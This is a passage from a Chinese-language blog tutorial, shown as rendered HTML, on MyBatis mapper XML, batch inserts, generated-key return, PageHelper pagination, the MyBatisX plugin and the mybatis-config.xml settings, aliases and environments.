class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">insert</span> id=&quot;insertUser&quot; &gt;<br>    <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">user</span> (<span class="hljs-type">name</span>, age) <span class="hljs-keyword">VALUES</span> (#&#123;<span class="hljs-type">name</span>&#125;, #&#123;age&#125;)<br>&lt;/<span class="hljs-keyword">insert</span>&gt;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>虽然我们可以直接书写任意的 SQL 插入语句，但在处理<strong>批量插入</strong>时，传入的参数往往非常多，不太可能一个个手动传入。而且，涉及<strong>主键回显</strong>的场景时，如果还要单独写一个方法来获取主键，就显得繁琐。因此，我们通常会采用更简洁、统一的方式来同时实现批量插入和主键回显，具体见下文。</li></ol></blockquote><hr><h5 id="2-1-2-批量插入"><a href="#2-1-2-批量插入" class="headerlink" title="2.1.2. 批量插入"></a>2.1.2. 批量插入</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">insert</span> id=&quot;insertUsers&quot;&gt;<br>    <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">user</span> (<span class="hljs-type">name</span>, age) <span class="hljs-keyword">VALUES</span><br>    &lt;<span class="hljs-keyword">foreach</span> collection=&quot;users&quot; item=&quot;user&quot; separator=&quot;,&quot;&gt;<br>        (#&#123;<span class="hljs-keyword">user</span>.name&#125;, #&#123;<span class="hljs-keyword">user</span>.age&#125;)<br>    &lt;/<span class="hljs-keyword">foreach</span>&gt;<br>&lt;/<span class="hljs-keyword">insert</span>&gt;<br></code></pre></td></tr></table></figure><hr><h5 id="2-1-3-主键回显"><a href="#2-1-3-主键回显" class="headerlink" title="2.1.3. 主键回显"></a>2.1.3. 主键回显</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 定义主键回显<br>&lt;<span class="hljs-keyword">insert</span> id=&quot;insertUser&quot; useGeneratedKeys=&quot;true&quot; keyProperty=&quot;id&quot; keyColumn=&quot;user_id&quot;&gt;<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">user</span> (<span class="hljs-type">name</span>, email) <span class="hljs-keyword">VALUES</span> (#&#123;<span class="hljs-type">name</span>&#125;, #&#123;email&#125;)<br>&lt;/<span class="hljs-keyword">insert</span>&gt;<br>&quot;&quot;&quot;<br>1. useGeneratedKeys=&quot;<span class="hljs-keyword">true</span>&quot;：<br>1. 告诉 MyBatis 去启用 自动获取数据库生成的主键。<br>2. keyProperty=&quot;id&quot;：<br>1. 告诉 MyBatis 将生成的主键值赋值给 Pojo 对象的 id 属性<br>3. keyColumn=&quot;user_id&quot;：<br>1. 显式指定数据库中的主键列名，适用于 Java 对象的主键属性与数据库表中的主键列名不一致的情况。<br>2. 如果 keyColumn 与 keyProperty 相同，则可以省略 keyColumn 配置。<br>3. 如果前面配置了结果映射 &lt;id column=&quot;user_id&quot; property=&quot;id&quot; /&gt; ，这里也可以省略<br>&quot;&quot;&quot;<br><br><br># <span class="hljs-number">2.</span> 使用示例<br><span class="hljs-type">int</span> rowsAffected = userMapper.insertUser(<span class="hljs-keyword">user</span>);        // 返回受影响的行数<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">user</span>.getId());                      // 输出主键值<br></code></pre></td></tr></table></figure><h4 id="2-2-删除操作"><a href="#2-2-删除操作" class="headerlink" title="2.2. 删除操作"></a>2.2. 删除操作</h4><h4 id="2-3-修改操作"><a href="#2-3-修改操作" class="headerlink" title="2.3. 修改操作"></a>2.3. 修改操作</h4><h4 id="2-4-查询操作"><a href="#2-4-查询操作" class="headerlink" title="2.4. 查询操作"></a>2.4. 查询操作</h4><h5 id="2-4-1-分页查询"><a href="#2-4-1-分页查询" class="headerlink" title="2.4.1. 分页查询"></a>2.4.1. 分页查询</h5><p>虽然可以使用原生 SQL 实现分页查询，但需要手动计算偏移量和总数，使用起来较为繁琐。通过 MyBatis 的分页插件 PageHelper，只需传入页码和每页条数，插件会自动计算并返回分页结果。</p><p>&#x3D;&#x3D;1.引入 MyBatis 分页插件依赖&#x3D;&#x3D;<br>引入 <a href="https://mvnrepository.com/artifact/com.github.pagehelper/pagehelper-spring-boot-starter">MyBatis 分页插件依赖</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>pagehelper-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.编写分页方法&#x3D;&#x3D;<br>需要注意的是，分页逻辑应写在 Service 层，因为插件是通过拦截 Mapper 方法（如 <code>umsResourceDao.selectListByCategoryId</code>）来修改底层 SQL，自动添加 <code>LIMIT</code> 和 <code>COUNT(*)</code> 语句，我们得再包一层才行。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">PageInfo</span>&lt;<span class="hljs-type">UmsResource</span>&gt; page(<span class="hljs-type">Integer</span> pageNum, <span class="hljs-type">Integer</span> pageSize, <span class="hljs-type">Long</span> categoryId) &#123;<br>    <span class="hljs-comment">// 1. 告诉 PageHelper 你想要第几页，每页几条</span><br>    <span class="hljs-type">PageHelper</span>.startPage(pageNum, pageSize);<br><br>    <span class="hljs-comment">// 2. 写你的正常查询逻辑（PageHelper 会拦截这个查询）</span><br>    <span class="hljs-type">List</span>&lt;<span class="hljs-type">UmsResource</span>&gt; resourceList <span class="hljs-operator">=</span> umsResourceDao.selectListByCategoryId(categoryId);<br><br>    <span class="hljs-comment">// 3. 把结果用 PageInfo 包装，里面有分页的各种信息</span><br>    <span class="hljs-keyword">return</span> new <span class="hljs-type">PageInfo</span>&lt;&gt;(resourceList);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="三、工具"><a href="#三、工具" class="headerlink" title="三、工具"></a>三、工具</h1><h3 id="1-MyBatisX-插件"><a href="#1-MyBatisX-插件" class="headerlink" title="1. MyBatisX 插件"></a>1. MyBatisX 插件</h3><p>IDEA 中的 MyBatisX 插件可以帮助我们：一键生成 Entity Pojo、Mapper 接口和 Mapper XML 映射文件</p><p>&#x3D;&#x3D;1.安装 MyBatisX 插件&#x3D;&#x3D;<br><img src="/2025/04/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20MyBatis/image-20250413092353572.png"></p><p>&#x3D;&#x3D;2.点击MyBatisX-Generator&#x3D;&#x3D;<br><img src="/image-20250517142511693.png"></p><p>&#x3D;&#x3D;3.配置实体类生成位置&#x3D;&#x3D;<br><img src="/image-20250517142611270.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>base path</code> 多级要用 <code>/</code> 感觉挺奇怪的，其他地方没有问题</li></ol></blockquote><p>&#x3D;&#x3D;4.配置 Mapper 接口 和 XML 文件生成位置&#x3D;&#x3D;<br><img src="/2025/04/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20MyBatis/image-20250413094940754.png"></p><hr><h1 id="四、补充"><a href="#四、补充" class="headerlink" title="四、补充"></a>四、补充</h1><h3 id="1-连接池预热"><a href="#1-连接池预热" class="headerlink" title="1. 连接池预热"></a>1. 连接池预热</h3><blockquote><p>[!NOTE] 注意事项</p><ol><li>不同的数据源在第一次使用时，通常都会初始化各自的连接池，因此你会感觉第一次进行操作会很慢，后续操作会很快。这一步也叫做：<strong>连接池预热</strong></li></ol></blockquote><hr><h3 id="2-项目目录结构"><a href="#2-项目目录结构" class="headerlink" title="2. 项目目录结构"></a>2. 项目目录结构</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Spring_Data_MySQL<br>├── <span class="hljs-attribute">src</span><br>│   └── <span class="hljs-selector-tag">main</span><br>│       ├── java<br>│       │   └── com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.spring_data_mybatis</span><br>│       │       ├── Application<span class="hljs-selector-class">.java</span>                          <span class="hljs-comment">// 项目启动类</span><br>│       │       ├── config<br>│       │       │   └── mapper<br>│       │       │       ├── DataSource1Config<span class="hljs-selector-class">.java</span>            <span class="hljs-comment">// 数据源1配置类</span><br>│       │       │       └── DataSource2Config<span class="hljs-selector-class">.java</span>            <span class="hljs-comment">// 数据源2配置类</span><br>│       │       ├── mapper                                    <span class="hljs-comment">// 或者是 DAO</span><br>│       │       │   ├── datasource1<br>│       │       │   │   └── UserMapper<span class="hljs-selector-class">.java</span>                   <span class="hljs-comment">// UserMapper 接口（数据源1下）</span><br>│       │       │   └── datasource2<br>│       │       │       └── CarMapper<span class="hljs-selector-class">.java</span>                    <span class="hljs-comment">// CarMapper 接口（数据源2下）</span><br>│       │       ├── model<br>│       │       │   └── entity<br>│       │       │       ├── datasource1<br>│       │       │       │   └── User<span class="hljs-selector-class">.java</span>                     <span class="hljs-comment">// User 实体类（数据源1下）</span><br>│       │       │       └── datasource2<br>│       │       │           └── Car<span class="hljs-selector-class">.java</span>                      <span class="hljs-comment">// Car 实体类（数据源2下）</span><br>│       │       ├── service<br>│       │       │   ├── datasource1<br>│       │       │   │   ├── UserService<span class="hljs-selector-class">.java</span>                  <span class="hljs-comment">// UserService 接口（数据源1下）</span><br>│       │       │   │   └── UserServiceImpl<span class="hljs-selector-class">.java</span>              <span class="hljs-comment">// UserService 实现类</span><br>│       │       │   └── datasource2<br>│       │       │       ├── CarService<span class="hljs-selector-class">.java</span>                   <span class="hljs-comment">// CarService 接口（数据源2下）</span><br>│       │       │       └── CarServiceImpl<span class="hljs-selector-class">.java</span>               <span class="hljs-comment">// CarService 实现类</span><br>│       │       └── controller<br>│       │           └── TestController<span class="hljs-selector-class">.java</span>                   <span class="hljs-comment">// TestController 类</span><br>│       └── resources<br>│           └── mapper<br>│               ├── datasource1<br>│               │   └── UserMapper<span class="hljs-selector-class">.xml</span>                        <span class="hljs-comment">// MyBatis 映射文件（数据源1下）</span><br>│               └── datasource2<br>│                   └── CarMapper<span class="hljs-selector-class">.xml</span>                         <span class="hljs-comment">// MyBatis 映射文件（数据源2下）</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-原生的-全局配置文件-书写方法"><a href="#3-原生的-全局配置文件-书写方法" class="headerlink" title="3. 原生的 全局配置文件 书写方法"></a>3. 原生的 全局配置文件 书写方法</h3><h4 id="3-1-全局配置文件概述"><a href="#3-1-全局配置文件概述" class="headerlink" title="3.1. 全局配置文件概述"></a>3.1. 全局配置文件概述</h4><p>MyBatis 全局配置文件，一般命名为：<code>mybatis-config.xml</code>，其规定 MyBatis 和那个数据库连接，如何连接，以及注册和处理 SQL 映射</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>在原生 MyBatis 开发中，我们确实要使用 <code>mybatis-config.xml</code><br>2.但是如果是 Spring Data MyBatis，我们用不到这个配置文件</li></ol></blockquote><hr><h4 id="3-2-文件基本结构"><a href="#3-2-文件基本结构" class="headerlink" title="3.2. 文件基本结构"></a>3.2. 文件基本结构</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"># 头文件<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span></span><br><span class="hljs-meta"><span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>  // 1. 全局配置<br>  <br>  // 2. 属性<br>  <br>  // 3. 类型别名<br>  <br>  // 4. 插件<br>  <br>  // 5. 环境配置<br>  <br>  // 6. 映射器<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="3-3-全局配置"><a href="#3-3-全局配置" class="headerlink" title="3.3. 全局配置"></a>3.3. 全局配置</h4><p>全局配置用于配置 MyBatis 的行为和特性，具体有哪些配置，请看：<a href="https://mybatis.org/mybatis-3/zh_CN/configuration.html#settings">MyBatis 3 官方文档</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;settings&gt;<br><br>  <span class="hljs-comment">// 1. 开启驼峰命名规则</span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mapUnderscoreToCamelCase&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span></span> <br><br><br>  <span class="hljs-comment">// 2. 其他配置项 </span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">setting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;配置名&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;对应值&quot;</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h4 id="3-4-属性"><a href="#3-4-属性" class="headerlink" title="3.4. 属性"></a>3.4. 属性</h4><p>属性允许在<strong>本文件内</strong>进行复用。如果同时定义了内部属性和外部属性，内部属性的优先级更高。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">// 1. 声明属性</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">  // 1.1. 声明内部属性</span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;property-name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;property-value&quot;</span>/&gt;</span></span><br><span class="language-xml">  </span><br><span class="language-xml">  // 1.2. 引用外部属性文件（properties 文件）</span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;db.properties&quot;</span>/&gt;</span>              // 从 resource 中加载</span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;file:/C:/config/db.properties&quot;</span>/&gt;</span> // 从 本地文件系统 中加载</span><br><span class="language-xml">  </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">// 2. 文件内复用属性（$</span><span class="hljs-template-variable">&#123;property-name&#125;</span><span class="language-xml">）</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;db.driver&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>/&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;db.url&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>/&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;db.username&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>/&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;db.password&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>/&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h4 id="3-5-类型别名"><a href="#3-5-类型别名" class="headerlink" title="3.5. 类型别名"></a>3.5. 类型别名</h4><p>在之前的 Mapper XML 映射文件中，我们需要引用 <strong>Entit</strong>y 类的<strong>全类名</strong>，这样显得繁琐。而类型别名的引入，可以为长的全类名起一个简短的别名，使得在 Mapper XML 中引用时更加简便。</p><p>需要注意的是，在 Mapper XML 映射文件中，<code>type</code> 和 <code>resultType</code> <strong>可以使用类的别名</strong>，但 <code>namespace</code> <strong>不支持使用别名。</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 1. 逐个定义类别名</span><br><span class="hljs-comment">// 1.1. 显示声明类别名</span><br>&lt;configuration&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">typeAliases</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">typeAlias</span> <span class="hljs-attr">alias</span>=<span class="hljs-string">&quot;User&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.example.model.User&quot;</span>/&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">typeAlias</span> <span class="hljs-attr">alias</span>=<span class="hljs-string">&quot;Order&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.example.model.Order&quot;</span>/&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">typeAliases</span>&gt;</span></span><br>&lt;/configuration&gt;<br><br><span class="hljs-comment">// 1.2. 直接使用类名作为类别名</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">typeAliases</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">typeAlias</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.example.model.User&quot;</span>/&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">typeAlias</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.example.model.Order&quot;</span>/&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">typeAliases</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></span><br><br><br><span class="hljs-comment">// 2. 批量定义类别名</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">typeAliases</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.example.model&quot;</span>/&gt;</span>      // 包下所有类的类别名都是类名</span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">typeAliases</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h4 id="3-6-插件"><a href="#3-6-插件" class="headerlink" title="3.6. 插件"></a>3.6. 插件</h4><hr><h4 id="3-7-环境配置"><a href="#3-7-环境配置" class="headerlink" title="3.7. 环境配置"></a>3.7. 环境配置</h4><p>环境配置使我们能够为不同的环境（如开发、测试、生产）设置不同的数据源和事务管理策略。这样，我们就可以通过 <code>SqlSessionFactoryBuilder</code> 轻松创建连接到各个数据源的 <code>SqlSessionFactory</code></p><p>通常情况下，我们会将环境配置<strong>具体到某 IP 下面的库</strong>，关于数据源的相关配置，请看：<a href="https://mybatis.org/mybatis-3/zh_CN/configuration.html#environments">MyBatis 3 官方文档</a></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;environments default<span class="hljs-operator">=</span><span class="hljs-string">&quot;default-environment-id&quot;</span>&gt;<br>  &lt;environment id<span class="hljs-operator">=</span><span class="hljs-string">&quot;environment-id&quot;</span>&gt;<br>  // <span class="hljs-number">1</span>. 配置事务管理<br>  &lt;transactionManager type<span class="hljs-operator">=</span><span class="hljs-string">&quot;事务管理器类型&quot;</span>&gt;<br>  // 事务管理器的具体配置项<br>  &lt;/transactionManager&gt;<br>  <br>  // <span class="hljs-number">2</span>. 配置数据源<br>  &lt;dataSource type<span class="hljs-operator">=</span><span class="hljs-string">&quot;数据源类型&quot;</span>&gt;<br>  <br>  // <span class="hljs-number">2.1</span>. 数据源配置<br>  &lt;property name<span class="hljs-operator">=</span><span class="hljs-string">&quot;driver&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;<br>  &lt;property name<span class="hljs-operator">=</span><span class="hljs-string">&quot;url&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;jdbc:mysql://localhost:3306/mydatabase&quot;</span>/&gt;<br>          &lt;property name<span class="hljs-operator">=</span><span class="hljs-string">&quot;username&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;root&quot;</span>/&gt;<br>          &lt;property name<span class="hljs-operator">=</span><span class="hljs-string">&quot;password&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;password&quot;</span>/&gt;<br>          <br>          // <span class="hljs-number">2.2</span>. 连接池配置<br>          &lt;property name<span class="hljs-operator">=</span><span class="hljs-string">&quot;poolMaximumActiveConnections&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;10&quot;</span>/&gt;<br>      &lt;property name<span class="hljs-operator">=</span><span class="hljs-string">&quot;poolMaximumIdleConnections&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;5&quot;</span>/&gt;<br>  &lt;property name<span class="hljs-operator">=</span><span class="hljs-string">&quot;poolTimeToWait&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;30000&quot;</span>/&gt;<br>  <br>  &lt;/dataSource&gt;<br>  &lt;/environment&gt;<br>&lt;/environments&gt;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">default-environment-id</font>：<ul><li>如果在使用 <code>SqlSessionFactoryBuilder</code> 创建 <code>SqlSessionFactory</code> 时没有指定环境 id，系统会默认使用该 id 所对应的环境来创建对象。</li></ul></li><li><font color="#00b0f0">事务管理器类型</font>：<ul><li><font color="#7030a0">JDBC</font>：<ul><li>直接使用 JDBC 的事务管理方式，适用于简单的应用或对事务控制要求较低的场景</li><li>在这种模式下，我们可以通过 <code>SqlSession</code> 手动控制事务，进行显式提交和回滚。</li></ul></li><li><font color="#7030a0">MANAGED</font>：<ul><li>由外部容器管理事务，适用于 J2EE 环境。事务通常由应用服务器或其他外部管理器控制</li></ul></li><li><font color="#7030a0">SPRING</font>：<ul><li>集成 Spring 框架的事务管理，适用于使用 Spring 的应用程序，能够充分利用 Spring 的事务管理优势。</li><li>如果需要 Spring 与 MyBatis 集成，通常不需要额外配置这些，因为 Spring 已经为我们完成了配置。</li></ul></li></ul></li><li><font color="#00b0f0">数据源类型</font>：<ul><li><font color="#7030a0">POOLED</font>：<ul><li>使用 MyBatis 内置的 